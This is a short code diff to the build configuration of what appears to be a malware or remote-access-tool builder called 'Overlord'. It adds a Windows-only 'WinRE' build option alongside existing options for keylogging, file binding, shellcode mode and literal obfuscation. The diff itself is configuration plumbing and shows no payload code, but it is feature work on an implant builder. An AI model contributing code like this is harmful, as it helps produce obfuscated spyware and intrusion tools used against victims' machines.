@@ -90,6 +90,7 @@ type BuildProcessConfig = {
   noPrinting?: boolean;
   disableKeylogger?: boolean;
   enableWebrtc?: boolean;
+  enableWinRE?: boolean;
   builtByUserId?: number;
   outputName?: string;
   garbleLiterals?: boolean;
@@ -1059,6 +1060,7 @@ func runBoundFiles() {
         if (config.noPrinting) baseTags.push("noprint");
         if (config.disableKeylogger) baseTags.push("nokeylogger");
         if (config.enableWebrtc) baseTags.push("overlord_webrtc");
+        if (config.enableWinRE && os === "windows") baseTags.push("overlord_winre");
         if (hasBoundFiles) baseTags.push("hasbinder");
         if (isIosTarget) baseTags.push("ios_target");
         if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");
